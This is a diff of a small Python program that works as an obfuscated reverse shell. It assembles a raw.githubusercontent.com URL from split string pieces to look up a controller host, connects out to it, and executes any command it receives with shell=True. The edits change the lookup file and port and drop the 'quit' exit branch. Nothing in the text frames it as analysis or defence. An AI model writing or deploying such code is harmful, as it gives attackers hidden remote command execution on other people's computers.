@@ -5,10 +5,7 @@ def connect(host, port):
 z = "el31"
 def process(s):
 	data = s.recv(1024)
-	if data == "quit":
-		s.close()
-		sys.exit(0)
-	elif len(data)==0:
+	if len(data)==0:
 		return True
 	else:
 		proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
@@ -21,11 +18,11 @@ def main():
 	while True:
 		try:
 			br = "aw.gith"
-			h = urllib.request.urlopen("https://r"+br+"ubusercontent.co"+ww+"cha"+z+"415926"+uwyd+"/asdf.txt").read().decode("utf-8").replace("\n","")
+			h = urllib.request.urlopen("https://r"+br+"ubusercontent.co"+ww+"cha"+z+"415926"+uwyd+"/asdf1.txt").read().decode("utf-8").replace("\n","")
 			while True:
 				socketDied=False
 				try:
-					s=connect(h.strip(),5002)
+					s=connect(h.strip(),5001)
 					while not socketDied:
 						s.send(b"\n>> ")
 						socketDied=process(s)
